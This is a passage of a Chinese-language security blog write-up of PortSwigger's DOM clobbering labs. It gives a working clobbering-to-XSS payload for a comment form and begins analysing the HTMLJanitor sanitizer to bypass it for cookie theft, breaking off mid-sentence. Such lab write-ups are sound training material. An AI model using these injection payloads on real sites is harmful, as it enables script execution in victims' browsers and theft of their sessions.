class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;ftp:Clobbered-username:Clobbered-Password@a&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.username)<span class="hljs-comment">//Clobbered-username</span></span></span><br><span class="line"><span class="hljs-actionscript">alert(x.password)<span class="hljs-comment">//Clobbered-password</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Exploit-Example"><a href="#Exploit-Example" class="headerlink" title="Exploit Example"></a>Exploit Example</h2><p>PostWigger &#x63D0;&#x4F9B;&#x4E86;&#x4E24;&#x4E2A;&#x5B9E;&#x9A8C;&#x73AF;&#x5883; <a href="https://portswigger.net/web-security/dom-based/dom-clobbering&#xFF0C;" target="_blank" rel="noopener">https://portswigger.net/web-security/dom-based/dom-clobbering&#xFF0C;</a></p><h3 id="Lab-Exploiting-DOM-clobbering-to-enable-XSS"><a href="#Lab-Exploiting-DOM-clobbering-to-enable-XSS" class="headerlink" title="Lab: Exploiting DOM clobbering to enable XSS"></a>Lab: Exploiting DOM clobbering to enable XSS</h3><blockquote><p>&#x200B;    This lab contains a DOM-clobbering vulnerability. The comment functionality allows &#x201C;safe&#x201D; HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">XSS</a> to call the alert() function.</p></blockquote><p>&#x8FD9;&#x4E2A;&#x5B9E;&#x9A8C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;<code>resources/js/loadCommentsWithDomPurify.js</code>&#x8DEF;&#x7531;&#x627E;&#x5230;&#x8FD9;&#x4E2A; JS &#x6587;&#x4EF6;&#xFF0C;&#x5728;<code>displayComments()</code>&#x51FD;&#x6570;&#x4E2D;&#x6211;&#x4EEC;&#x53C8;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> defaultAvatar = <span class="hljs-built_in">window</span>.defaultAvatar || {<span class="hljs-attr">avatar</span>: <span class="hljs-string">&apos;/resources/images/avatarDefault.svg&apos;</span>}</span><br><span class="line"><span class="hljs-keyword">let</span> avatarImgHTML = <span class="hljs-string">&apos;&lt;img class=&quot;avatar&quot; src=&quot;&apos;</span> + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + <span class="hljs-string">&apos;&quot;&gt;&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> divImgContainer = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line">divImgContainer.innerHTML = avatarImgHTML</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x5F88;&#x660E;&#x663E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; Dom Clobbering &#x6765;&#x63A7;&#x5236; <code>window.defaultAvatar</code>&#xFF0C;&#x53EA;&#x8981;&#x6211;&#x4EEC;&#x539F;&#x6765;&#x6CA1;&#x6709;&#x5934;&#x50CF;&#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x4E2A;&#x6784;&#x9020;&#x4E00;&#x4E2A;<code>defaultAvatar.avatar</code>&#x8FDB;&#x884C; XSS &#x4E86;&#x3002;</p><p>&#x6839;&#x636E;&#x524D;&#x9762;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E24;&#x5C42;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; HTMLCollection &#x6765;&#x64CD;&#x4F5C;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span> <span class="hljs-attr">name</span>=<span class="hljs-string">avatar</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x6CE8;&#x610F;<code>&quot;</code>&#x9700;&#x8981;&#x8FDB;&#x884C; HTML&#x5B9E;&#x4F53;&#x7F16;&#x7801;&#xFF0C;&#x7528; URL &#x7F16;&#x7801;&#x7684;&#x8BDD;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x62A5;&#x9519;<code>1:%22onerror=alert(1)// net::ERR_FILE_NOT_FOUND</code>&#x3002;</p><p>&#x8FD9;&#x6837;&#x8BC4;&#x8BBA;&#x4EE5;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x8BC4;&#x8BBA;&#x5904;&#x770B;&#x5230;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;defaultAvatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;avatar&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;defaultAvatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x518D;&#x968F;&#x4FBF;&#x8BC4;&#x8BBA;&#x4E00;&#x4E0B;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684; XSS &#x4E86;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png" alt></p><h3 id="Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters"><a href="#Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters" class="headerlink" title="Lab:Clobbering DOM attributes to bypass HTML filters"></a>Lab:Clobbering DOM attributes to bypass HTML filters</h3><blockquote><p>&#x200B;    This lab uses the HTMLJanitor library, which is vulnerable to <a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener">DOM clobbering</a>. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that alerts document.cookie. You may need to use the exploit server in order to make your vector auto-execute in the victim&#x2019;s browser.</p><p>Note: The intended solution to this lab will not work in Firefox. We recommend using Chrome to complete this lab.</p></blockquote><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x5728;<code>resources/js/loadCommentsWithHtmlJanitor.js</code>&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x4EE3;&#x7801;&#x5B89;&#x5168;&#x591A;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x660E;&#x663E;&#x7684;&#x76F4;&#x63A5;&#x7528;<code>Window.x</code>&#x8FD9;&#x79CD;&#x4EE3;&#x7801;&#x4E86;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> janitor = <span class="hljs-keyword">new</span> HTMLJanitor({<span class="hljs-attr">tags</span>: {<span class="hljs-attr">input</span>:{<span class="hljs-attr">name</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">type</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">value</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">form</span>:{<span class="hljs-attr">id</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">i</span>:{},<span class="hljs-attr">b</span>:{},<span class="hljs-attr">p</span>:{}}});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x521D;&#x59CB;&#x5316;&#x4E86;<code>HTMLJanitor</code>&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x521D;&#x59CB;&#x5316;&#x5185;&#x7684;&#x6807;&#x7B7E;&#x53CA;&#x5176;&#x5C5E;&#x6027;&#xFF0C;&#x5BF9;&#x4E8E;&#x91CD;&#x8981;&#x7684;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x5730;&#x65B9;&#x90FD;&#x4F7F;&#x7528;&#x4E86;<code>janitor.clean</code>&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x6CA1;&#x529E;&#x6CD5;&#x5F88;&#x7B80;&#x5355;&#x5730;&#x8FDB;&#x884C; XSS &#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x5C31;&#x53EA;&#x80FD;&#x6765;&#x770B;&#x770B;<code>resources/js/htmlJanitor.js</code>&#x8FD9;&#x4E2A;&#x8FC7;&#x6EE4;&#x6587;&#x4EF6;&#x4E86;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype.clean = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">html</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">const</span> sandbox = <span class="hljs-built_in">document</span>.implementation.createHTMLDocument(<span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">  <span class="hljs-keyword">const</span> root = sandbox.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line">  root.innerHTML = html;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(sandbox, root);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> root.innerHTML;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9996;&#x5148;&#x7528;<code>document.implementation.createHTMLDocument</code>&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7684; HTML &#x6587;&#x6863;&#x7528;&#x4F5C; sandbox &#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x4E8E; sandbox &#x5185;&#x7684;&#x5143;&#x7D20;&#x8FDB;&#x884C;<code>_sanitize</code>&#x8FC7;&#x6EE4;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype._sanitize = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">document, parentNode</span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">var</span> treeWalker = createTreeWalker(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;<code>_sanitize</code>&#x51FD;&#x6570;&#x4E00;&#x5F00;&#x59CB;&#x8C03;&#x7528;&#x4E86;<code>createTreeWalker</code>&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;<code>TreeWalker</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x7C7B;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x5F53;&#x524D;&#x6587;&#x6863;&#x7684;&#x5B50;&#x6811;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8282;&#x70B9;&#x53CA;&#x5176;&#x4F4D;&#x7F6E;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createTreeWalker</span>(<span class="hljs-params">document, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">document</span>.createTreeWalker(</span><br><span class="line">    node,</span><br><span class="line">    NodeFilter.SHOW_TEXT |</span><br><span class="line">    NodeFilter.SHOW_ELEMENT |</span><br><span class="line">    NodeFilter.SHOW_COMMENT,</span><br><span class="line">    <span class="hljs-literal">null</span>,</span><br><span class="line">    <span class="hljs-literal">false</span></span><br><span class="line">  );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x7684;<code>node</code>&#x5373;&#x4E3A;&#x4E00;&#x5F00;&#x59CB;&#x7684;<code>root</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;<code>html</code>&#x4F1A;&#x5728;&#x4F20;&#x5165;&#x5230;<code>node</code>&#x53C2;&#x6570;&#xFF0C;<code>document</code>&#x5373;&#x4E3A;&#x4E00;&#x5F00;&#x59CB;&#x7684;<code>sandbox</code>&#xFF0C;&#x63A5;&#x7740;&#x8FDB;&#x5165;&#x5FAA;&#x73AF;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#xFF0C;&#x5BF9;&#x4E8E;&#x6587;&#x672C;&#x5462;&#x7ED2;&#x4EE5;&#x53CA;&#x6CE8;&#x91CA;&#x8FDB;&#x884C;&#x5904;&#x7406;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.TEXT_NODE) {</span><br><span class="line">true<span class="hljs-comment">//&#x5982;&#x679C;&#x6B64;&#x6587;&#x672C;&#x8282;&#x70B9;&#x53EA;&#x662F;&#x7A7A;&#x767D;&#xFF0C;&#x5E76;&#x4E14;&#x4E0A;&#x4E00;&#x4E2A;&#x6216;&#x4E0B;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x540C;&#x7EA7;&#x662F;`blockElement`&#xFF0C;&#x5219;&#x5C06;&#x5176;&#x5220;&#x9664;</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// &#x79FB;&#x9664;&#x6240;&#x6709;&#x7684;&#x6CE8;&#x91CA;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.COMMENT_NODE) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//&#x68C0;&#x67E5;`inlineElement`&#x4E2D;&#x662F;&#x5426;&#x8FD8;&#x6709;`BlockElement`</span></span><br><span class="line"><span class="hljs-keyword">var</span> isInline = isInlineElement(node);</span><br><span class="line"><span class="hljs-keyword">var</span> containsBlockElement;</span><br><span class="line"><span class="hljs-keyword">if</span> (isInline) {</span><br><span class="line">  containsBlockElement = <span class="hljs-built_in">Array</span>.prototype.some.call(</span><br><span class="line">    node.childNodes,</span><br><span class="line">    isBlockElement</span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//&#x68C0;&#x67E5;`BlockElement`&#x662F;&#x5426;&#x5D4C;&#x5957;</span></span><br><span class="line"><span class="hljs-keyword">var</span> isNotTopContainer = !!parentNode.parentNode;</span><br><span class="line"><span class="hljs-keyword">var</span> isNestedBlockElement =</span><br><span class="line">    isBlockElement(parentNode) &amp;&amp;</span><br><span class="line">    isBlockElement(node) &amp;&amp;</span><br><span class="line">    isNotTopContainer;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> nodeName = node.nodeName.toLowerCase();</span><br><span class="line"><span class="hljs-comment">//&#x83B7;&#x53D6;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x7684;&#x5C5E;&#x6027;</span></span><br><span class="line"><span class="hljs-keyword">var</span> allowedAttrs = getAllowedAttrs(<span class="hljs-keyword">this</span>.config, nodeName, node);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//&#x6839;&#x636E;&#x767D;&#x540D;&#x5355;&#x5220;&#x9664;&#x6807;&#x7B7E;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (</span><br><span class="line">  isInvalid ||</span><br><span class="line">  shouldRejectNode(node, allowedAttrs) ||</span><br><span class="line">  (!<span class="hljs-keyword">this</span>.config.keepNestedBlockElements &amp;&amp; isNestedBlockElement)</span><br><span class="line">) {</span><br><span class="line">  <span class="hljs-comment">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    !(node.nodeName === <span class="hljs-string">&quot;SCRIPT&quot;</span> || node.nodeName === <span class="hljs-string">&quot;STYLE&quot;</span>)</span><br><span class="line">  ) {</span><br><span class="line">    <span class="hljs-keyword">while</span> (node.childNodes.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">      parentNode.insertBefore(node.childNodes[<span class="hljs-number">0</span>], node);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  parentNode.removeChild(node);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-keyword">break</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6700;&#x540E;&#x770B;&#x5230;&#x503C;&#x5F97;&#x6211;&#x4EEC;&#x5173;&#x6CE8;&#x7684;&#x70B9;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Sanitize attributes</span></span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a += <span class="hljs-number">1</span>) {</span><br><span class="line">  <span class="hljs-keyword">var</span> attr = node.attributes[a];</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (shouldRejectAttr(attr, allowedAttrs, node)) {</span><br><span class="line">    node.removeAttribute(attr.name);</span><br><span class="line">    <span class="hljs-comment">// Shift the array to continue looping.</span></span><br><span class="line">    a = a - <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Sanitize children</span></span><br><span class="line"><span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, node);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x8FD9;&#x91CC;&#x6700;&#x7EC8;&#x5BF9;&#x6807;&#x7B7E;&#x7684;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x4E86; check &#xFF0C;&#x5BF9; node &#x7684;&#x6BCF;&#x4E2A;&#x5C5E;&#x6027;&#x90FD;&#x8FDB;&#x884C;&#x4E86;&#x767D;&#x540D;&#x5355;&#x68C0;&#x67E5;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shouldRejectAttr</span>(<span class="hljs-params">attr, allowedAttrs, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> attrName = attr.name.toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (allowedAttrs === <span class="hljs-literal">true</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;function&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> !allowedAttrs[attrName](attr.value, node);</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;undefined&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (allowedAttrs[attrName] === <span class="hljs-literal">false</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;string&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> allowedAttrs[attrName] !== attr.value;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6709;&#x4E0D;&#x5728;&#x767D;&#x540D;&#x5355;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;<code>node.removeAttribute(attr.name);</code>&#x8FDB;&#x884C;&#x5220;&#x9664;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x5B50;&#x8282;&#x70B9;&#x8FDB;&#x884C;&#x9012;&#x5F52;<code>_sanitize</code>&#x3002;&#x6240;&#x4EE5;&#x6709;&#x4E24;&#x4E2A;&#x601D;&#x8DEF;&#xFF0C;&#x8981;&#x4E48;&#x7ED5;&#x6807;&#x7B7E;&#x8FC7;&#x6EE4;&#xFF0C;&#x8981;&#x4E48;&#x7ED5;&#x8282;&#x70B9;&#x5C5E;&#x6027;&#x8FC7;&#x6EE4;&#x3002;</p><p>&#x6807;&#x7B7E;&#x7684;&#x83B7;&#x53D6;&#x7531;<code>treeWalker.firstChild();</code>&#x5F97;&#x5230;&#xFF0C;&#x8FC7;&#x6EE4;&#x7531;<code>getAllowedAttrs</code>&#x4EE5;&#x53CA;<code>shouldRejectNode</code>&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#xFF0C;&#x7531;&#x4E8E;&#x8FD9;&#x91CC;&#x7684;&#x8FC7;&#x6EE4;&#x662F;&#x8FDB;&#x884C;&#x767D;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x529E;&#x6CD5;&#x8FDB;&#x884C;&#x7E